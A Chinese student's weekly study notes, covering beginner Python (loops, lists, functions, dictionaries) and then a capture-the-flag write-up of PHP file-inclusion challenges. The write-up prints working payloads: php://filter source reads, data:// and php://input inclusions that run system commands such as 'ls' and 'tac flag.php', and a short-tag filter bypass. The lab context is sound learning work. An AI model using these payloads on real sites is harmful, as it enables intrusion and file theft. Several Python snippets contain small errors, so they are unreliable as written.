# week3

------

## 本周学习：

学习python

学习文件包含

------

## 下周预计

## python

青岑web题库

------

## 内容分享：

python：

for循环补充：

当然for循环的一串值除了range（产生一串数字的工具）之外还可以是列表，因为列表本身就是一串值，关于列表的知识后续会提到这里只是做一个简单的补充和一个简单的例子

```
number = [80, 90, 100]

for n in numbers:
    print(n)
```

输出为

```
80
90
100
```

他的执行过程为

```
第 1 轮：n = 80
第 2 轮：n = 90
第 3 轮：n = 100
```

### - while循环：

上文的for循环虽然好用，但仍有局限，因为for循环只适合于知道要循环几次的情况下，面对不知道循环次数的情况时，for循环就排不上用场，这时就需要while循环。

while循环是“只要条件成立就一直重复”

现在我们用一个例子来演示一下

```python
n = 1#设一个变量n=1

while n <= 4:#如果n小于等于4执行循环
    print(n)
    n = n + 1
```

此时输出为

```
1
2
3
4
```

它实际的执行过程是

```
n = 1，1 <= 4 成立 → 打印 1 → n 变成 2
n = 2，2 <= 4 成立 → 打印 2 → n 变成 3
n = 3，3 <= 4 成立 → 打印 3 → n 变成 4
n = 4，4 <= 4 成立 → 打印 4 → n 变成 5
n = 5，5 <= 4 不成立 → 循环结束
```

while循环有几个关键点：

- `while` 每一轮开始前都会检查条件。
- 条件成立，执行缩进的循环体。
- 条件不成立，跳过循环体，执行循环后面的代码。
- `n = n + 1` 必须写在循环体里，而且必须缩进；否则 `n` 一直是 1，会无限循环。
- 也可以简写成 `n += 1`。

了解了while循环的大体后我们就可以看两个关键字：break和continue。这两个关键字可以控制while的循环。

| 关键字   | 作用                                 |
| -------- | ------------------------------------ |
| break    | 立刻结束循环                         |
| continue | 跳过这一轮剩下的代码，直接进入下一轮 |

break：立刻结束循环

break出现时会立刻结束整个循环，它后面的循环体也不会执行，举个例子

```
n = 1

while n <= 5:
    if n == 3:
        break
    print(n)
    n += 1

print("结束")
```

他的输出就是

```
1
2
结束
```

可以看见输出结果到2之后就停了，他的过程是这样的：

- `n = 1`，打印 1，然后变成 2；
- `n = 2`，打印 2，然后变成 3；
- `n = 3`，`if n == 3` 成立，执行 `break`；
- `break` 立刻结束整个循环，`print(n)` 和 `n += 1` 都不再执行；
- 最后执行循环外面的 `print("结束")`。

continue：跳过这一轮

```python
n = 0

while n < 5:
    n += 1

    if n == 3:
        continue

    print(n)	
```

他的输出是：

```
1
2
4
5
```

可以看见他是把3给跳过了的，具体过程是这样的：

- `n = 1`，打印 1；
- `n = 2`，打印 2；
- `n = 3`，`continue` 跳过这一轮的 `print(n)`，直接回到循环开头；
- `n = 4`，打印 4；
- `n = 5`，打印 5；
- `n = 6`，条件不成立，循环结束。

这里有一个关键就是他这里是必须先让n增加，然后再continue。如果n一直是3，continue会让程序永远卡在这一块。

## ***列表***

列表可以用来一次存多个值，用方括号[]表示，里面的值用逗号隔开：

```
words = ["a","b","c"]
```

这个列表其实就像一个有一排格子的柜子：

```
编号：0    1   2
    ["a","b","c"]
```

其实联想一下就会发现它和c语言的数组很像但是它比c要灵活许多

| 对比     | c数组                    | python列表             |
| -------- | ------------------------ | ---------------------- |
| 大小     | 固定，定义后不能随便变长 | 可以增加、删除元素     |
| 元素类型 | 通常必须相同             | 可以放不同类型         |
| 小标     | 从0开始                  | 从0开始                |
| 负数小标 | 不支持                   | 支持，[-1]表示最后一个 |
| 越界访问 | 不检查，可能有危险       | 会报indexerror         |
| 长度     | 需要自己记录             | 用len（）直接获取      |
| 写法     | int a[3] = {1,2,3};      | a = [1,2,3]            |

 根据这些可以发现我们从列表中取值时可以从前往后或从后往前两种取法，但都是用print(words[])来取

在刚刚的比较里还提到了列表变长，它的写法是words.append("")相对应的还有删除缩短写法为words.remove("")和修改words[1] = "B"

这里举个小例子

```
words = ["a","b"]
words.append("c")
words.remove("a")
words[1] = "B"

print(words)
```

输出为```['B','c']```

同时还有查看列表长度

```
words = ["a","b","c"]
print(len(words))
```

输出为```3```

for循环遍历：

如果要一次性看完表里有什么直接用for循环遍历列表查看所有元素：

```python
words = ["a","b","c"]

for word in words:
    print(word)
```

输出为

```
a
b
c
```

检查元素是否存在：

```
words = ["a","b","c"]

if "b" in words
    print("have it")
```

## ***函数***

python的函数和c大差不差，都是将一串代码打包方便后续调用，他是这样的

```python
def hanshu():
    print("hello")
hanshu()
```

输出就是```hello```

这里的def就是定义函数的关键字，（）是参数列表，下面的print就是函数体，只有被调用时才会运行。

稍微复杂一点的就是带有参数的函数

```python
def hanshu(words):
    print("word=",words)
hanshu("a")
```

输出就是```word=a```

这里的words是参数就相当于函数内部的变量。每次调用时传入的都是实际的值。并且每次调用words会接收不同的值。

再向下延深就是带有返回值的函数

```python
def add(a,b):
    return a + b
    
result = add(2,3)
print(result)
```

输出为```5```

这里return的作用是把计算机结果交回给调用者

所以result调用add函数时就return就会把计算结果交给result，也就是把5存进了result。

之所以有return就是因为在一些时候我们需要函数的返回值去执行剩下的代码，如果我们需要的是函数返回的值而不用它去执行函数外的代码时往往可以直接print即

```
def add(a,b)
    print(a + b)
add(2,3)
```

下面再写一个需要函数返回值参与计算的

```
def lifang(n):
    return n ** 3
    
print(lifang(2) + lifang(3))
```

## - 小进阶：平均分计算

假设有三个成绩需要算出他们的平均分，可以这么写

```
def pingjun(a,b,c):
    return (a + b + c) / 3
result = pingjun(int(input("hsuzi1: ")),int(input("hsuzi2: ")),int(input("hsuzi3: ")))
print(round(result, 2)
```

这里有个小知识点就是round（），它是表示保留几位小数时需要用到的，它的写法是round（变量， 需要保留的位数）

当然这个小计算器仍然有缺陷就是他只能算固定的三个成绩，并不实用所以可以将函数和列表相结合一下：

```python
def pingjun(numbers):
    total = 0
    
    for n in numbers:
        total = total + n
        
    return total / len(numbers)

scores = []
count = int(input("输入成绩个数： "))
for i in range(count):
    score = int(input("输入成绩： "))
    scores.append(score)
print(round(pingjun(scores), 2))
```

这样就达成了我们日常算平均分最常用的样子，同时还可以加上寻找最大最小值的功能即设两个函数

```
def findmax(numbers):
    biggest = numbers[0]

    for n in numbers:
        if n > biggest:
            biggest = n
    return biggest

def findmin(numbers):
    zuixiao = numbers[0]

    for i in numbers:
        if i < zuixiao:
            zuixiao = i
    return zuixiao
```

他的具体过程是这样的（最大值为例）

| 当前 n | biggest 原来 | n > biggest？ | biggest 更新后 |
| ------ | ------------ | ------------- | -------------- |
| 80     | 80           | 否            | 80             |
| 90     | 80           | 是            | 90             |
| 85     | 90           | 否            | 90             |
| 85     | 90           | 否            | 90             |

返回：90

当然为了方便也可以使用python自带的max和min

```
print(max(scores))
print(min(scores))
```

汇总一下就是我们的完整的统计成绩平均值找最值的代码

```python
def pingjun(numbers):
    total = 0
    
    for n in numbers:
        total = total + n
        
    return total / len(numbers)

scores = []
count = int(input("输入成绩个数： "))
for i in range(count):
    score = int(input("输入成绩： "))
    scores.append(score)
print(round(pingjun(scores), 2))

def findmax(numbers):
    biggest = numbers[0]

    for n in numbers:
        if n > biggest:
            biggest = n
    return biggest

def findmin(numbers):
    zuixiao = numbers[0]

    for i in numbers:
        if i < zuixiao:
            zuixiao = i
    return zuixiao

print("最大值： ", findmax(scores))
print("最小值： ", findmin(scores))
```

## ***字典***

字典像一排贴了标签的抽屉，用这些标签来找数据，这里举一个例子

```
student = {
    "name": "小明",
    "age": 18,
    "score": 90
}

print(student["name"])   # 小明
print(student["score"])  # 90
```

可以看见字典给数据打上了name，score这样的标签，使得他能精准的找到对应的数据，这样看的话会觉得他和c语言里的指针有点像，但并不完全一样。

他们像的地方在都是指向同一个列表对象。

区别在于字典不是内存地址

指针是内存地址：

```
int x = 10;
int *p = &x;   // p 保存 x 的地址
*p = 20;       // 通过地址修改 x
```

可以对指针做地址运算，也可以出现空指针，野指针。

python的字典是键值映射，内部是哈希表

```
student = {
    "name": "小明",
    "score": 90
}
```

- `"name"` 是键；
- `"小明"` 是值；
- 字典通过键找到对应的值；
- 键会被哈希，不是直接拿内存地址；
- 不能对字典做“地址加 1”这种操作。

所以准确的说字典更像一本电话本：按名字查号码；

指针像一张写着房间号的纸条：按地址找房间

|                | C 指针           | Python 字典          |
| -------------- | ---------------- | -------------------- |
| 本质           | 内存地址         | 键值映射 / 哈希表    |
| 查找方式       | 解引用地址       | 按键查找             |
| 能否做地址运算 | 可以             | 不可以               |
| 键的类型       | 没有“键”的概念   | 字符串、数字、元组等 |
| 找不到时       | 可能访问非法内存 | 通常报 `KeyError`    |
| 安全性         | 较低             | 较高                 |

字典的写法：

```
变量 = {
    "标签": 值,
    "标签": 值,
    "标签": 值
}
```

- 用花括号 `{}`
- 每一项是 `键: 值`
- 键和值之间用冒号 `:`
- 多项之间用逗号 `,`
- 键通常是字符串，要加引号
- 值可以是字符串、数字、列表，甚至另一个字典

这里有一个小点需要强调一下：花括号{}用来创建字典，方括号[]用来从字典里面取东西。

了解了这些之后一并来看一下读取、修改、添加：

```
student = {
    "name": "小明",
    "age": 18,
    "score": 90
}

print(student["name"])     # 读取

student["score"] = 95      # 修改
student["city"] = "北京"    # 添加

print(student)
```

`student["score"] = 95` 的规则：

- 如果 `"score"` 这个键已经存在，就修改它的值；
- 如果不存在，就新增这一项。

再往下走就是字典的删除

```
del student["age"]
```

这样就会删除"age"这一项。

然后就是遍历字典

```
for key in student:
    print(key, ":", student[key])
```

他的输出会是：

```
name:小明
age: 18
score: 90
```

for key in student每次得到的是键，再用student[key]取出对应的值。

最后就是其他的常用操作：

```
print(len(student))          # 字典里有几项
print("name" in student)     # 判断键是否存在
```

这里有个值得注意的小点就是in在这里判断的是键，不是值。

如果访问不存在的键就会报错keyerror

这里为了防止报错就可以用get这个方法：

​       get是字典自带的一个方法，用来按键取值，但是比上面的student["age"]这种的更加温和。

基本写法

```
student = {
    "name": "小明",
    "age": 18
}

print(student.get("name"))
```

他的输出是```小明```

如果键存在，get和方括号的效果一样。

但是当键不存在时，如果我们用的是方括号的```print(student["age"])会直接显示报错

```
KeyError: 'age'
```

但是如果我们用的是get：

```
print(student.get("phone"))
```

他不会报错而是显示```None```

None表示“没有值”。

同时我们也可以指定默认值

```
peint(student.get("age","没有这个信息"))
```

此时他的显示就会是```没有这个信息```

可以看见这第二个参数“没有这个欣喜”就是默认值：所以如果“age”存在，就会返回age的值，如果不存在，就会返回我们输入的默认值，没有输入默认值就会返回none

把get和方括号做一个简单的对比：

| 写法                           | 键存在       | 键不存在      |
| ------------------------------ | ------------ | ------------- |
| `student["phone"]`             | 返回对应的值 | 报 `KeyError` |
| `student.get("phone")`         | 返回对应的值 | 返回 `None`   |
| `student.get("phone", "没有")` | 返回对应的值 | 返回 `"没有"` |

所以**`get` = 安全地按键取值：有就返回，没有就返回默认值，不报错，也不修改字典。**

学习了这些我们就可以做一个学生信息卡这样的小程序：

```python
a = input("请输入姓名： ")
b = int(input("年龄： "))
c = int(input("成绩: "))
student = {
    "name": a,
    "age": b,
    "score": c
}
print(student)
student["score"] = c + 5
d = input("输入所在城市： ")
student["city"] = d
print(len(student))
for key in student:
    print(key, ":", student[key])
```

他的输出会是

```
请输入姓名： xuqing
年龄： 18
成绩: 456
{'name': 'xuqing', 'age': 18, 'score': 456}
输入所在城市： xian
4
name : xuqing
age : 18
score : 461
city : xian
```

这一串程序总共实现了这几个功能：

1. 用 `input()` 输入姓名、年龄、成绩；
2. 存进一个字典 `student`，键分别是 `"name"`、`"age"`、`"score"`；
3. 输出姓名、年龄、成绩；
4. 把成绩加 5 分；
5. 增加一个 `"city"` 键；
6. 用 `for` 循环输出字典里的所有键和值；
7. 输出字典的长度。

## ezfl

## ezfl_1

打开容器后按f12查看源码发现了一行注释

```
<!-- VGhlIGZsYWcgaXMgcmlnaHQgaW4gZmxhZy5waHAsIGJ1dCB5b3UnbGwgbmV2ZXIgYmUgYWJsZSB0byBzZWUgaXQuIA== -->
```

发现其为base64编码，解码后显示为

```
The flag is right in flag.php, but you'll never be able to see it. 
```

获得flag文件地址为flag.php但他后面却说无法看见flag，我们先访问一下/flag.php回显

```
flag就在这里，不过我把他藏起来了
```

根据这句话，推测flag就在这个flag.php里面，但没有flag，说明他在源码里面（flag没有显示）所以我们可以用php://filter来绕过执行，直接读取源码，观察到当我们随意点开网页内容时，url为？file=，所以最终的访问形式就是

```
/?file=php://filter/convert.base64-encode/resource=flag.php
```

输入后获得一串base64编码的值

```
PD9waHANCmVjaG8gImZsYWflsLHlnKjov5nph4zvvIzkuI3ov4fmiJHmiorku5bol4/otbfmnaXkuoYiOw0KLy9mbGFne2RjYTg5N2E4LTkzZjEtNGQ2NC04OGMyLTQyY2QxZTZhOGU4YX0= 
```

解码后获得flag

```
<?php
echo "flag就在这里，不过我把他藏起来了";
//flag{dca897a8-93f1-4d64-88c2-42cd1e6a8e8a}
```

可以看见他这里确实是将flag注释掉了使得他显示不出来

除了这种常规的解题方式之外还用一种更快，效率更高的方法：

```
?file=data:,<?php system('ls')?>
?file=data:,<?php system('tac flag.php')?>
```

data伪协议 + PHP代码执行，这样的操作是将文件包含漏洞升级成rce.

第一句的作用是侦察，ls看当前目录有哪些文件，确认flag的文件名。把第一句拆开来看（只是解释一下为什么这样写）

| 部分                   | 含义                             |
| ---------------------- | -------------------------------- |
| `?file=`               | 题目 `include` 的参数            |
| `data:`                | data URI 伪协议                  |
| `,`                    | 分隔元信息和数据，后面是真正内容 |
| `<?php system('ls')?>` | 被 `include` 当成 PHP 执行的代码 |

`include` 打开 `data:` 这个流后，PHP 会把后面的 `<?php ... ?>` 当代码执行，于是：

```system('ls')```执行系统命令ls，列出当前目录，页面回显文件名。

注意：这里有一个前提就是allow_url_include=on.如果是off，data：//就用不了了。

第二句的作用是读取，知道文件名是flag.php后，用tac去读获得回显

```
//flag{78e59360-b52f-4423-9f41-e2b672d714d0}echo "flag就在这里，不过我把他藏起来了"; 
```

这里有一个小知识点就是tac，之所以这里用的是tac而不是cat是因为cat要比tac多一个步骤，从基础做法里我们已经知道flag.php是

```
<?php
echo "flag就在这里，不过我把他藏起来了";
//flag{78e59360-...}
```

用cat去抓的时候这段内容被直接塞进 HTML 页面里。浏览器看到开头的 `<?php`，会把它当成一段**非法注释/bogus comment**，一直吞到后面的 `>` 才结束。结果就是：echo那行被隐藏，//flag也被隐藏导致页面上看上去什么都没有，但是cat是已经被执行成功了的，只是被当作注释没有显示出来，所以需要再ctrl+u查看源码在源码里搜flag最终获得flag。

而tac虽然作用和cat一样，但他是倒序显示，也就是先显示的是//flag这一行即输出的是

```
//flag{78e59360-...}
echo "flag就在这里，不过我把他藏起来了";
<?php
```

flag 行跑到最前面了，浏览器会正常把它当文本显示；最后的 `<?php` 才被当成注释吞掉，已经不影响前面的 flag。

所以我们访问就能直接看到，省去了查看源码这一步，更加便捷。

## ezfl_2

打开容器有了上一题的经验这次我们直接用

```
?file=data:,<?php system('ls')?>
```

查看当前目录文件名，发现flag在flag.php里面输入

```
?file=data:,<?php system('tac flag.php')?>
```

获得flag（其实是用常规操作输入php://filter去读取源码的时候回显no way了，呜呜呜qaq）

## ezfl_3

打开容器，再次输入

```
?file=data:,<?php system('ls')?>
```

查看当前目录文件名发现回显为

```
index.php pages
```

并没有发现flag文件，再往根目录那里找

```
?file=data:,<?php system('ls / ')?>
```

查看根目录内容获得回显

```
bin boot dev entrypoint.sh etc flag-33zxDJYATMCVrtsntNDKbMxx3oRLuj.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var 
```

发现flag文件```flag-33zxDJYATMCVrtsntNDKbMxx3oRLuj.txt```用tac读取

```
?file=data:,<?php system('tac /flag-33zxDJYATMCVrtsntNDKbMxx3oRLuj.txt')?>
```

注意：这里不是根目录是当前目录需要加/表示根目录

## ezfl_4

打开容器输入

```
?file=data:,<?php system('ls')?>
```

查看当前目录文件名发现显示

```
php not allow
```

发现php字符被过滤，这里有两种解法绕过，只写一种（绝不是因为我懒）

1，大小写绕过（暂不展示）

2，php短标签绕过（需要 `short_open_tag=On`）：

将

```
?file=data:,<?php system('ls')?>
```

里的php删去改为

```
?file=data:,<? system('ls')?>
```

（开启了short_open_tag = On，所以 PHP 把 `<?` 也当成 `<?php` 来解析。）

获得flag文件flag.php然后输入去读取文件，但需要注意的是这个文件自己也带有php，所以需要通配符*

```
?file=data:,<? system('tac flag.*')?>
```

获得flag

## ezdl_5

打开容器，输入

```
?file=data:,<?php system('ls')?>
```

php被过滤，删去php后又显示data被过滤，此时data伪协议已经用不了了，我们换一个伪协议

打开hackbar，url填

```
?file=PHP://input
```

POST请求

```
POST: <?php system("tac flag.php");?>
```

执行后发现无效果，斯，不应该啊，呼叫一下康可可，每次遇到困难康可可都会来帮我awa，康可可博客上说是因为hackbar的问题，要用bp去做，用bp上传，获得flag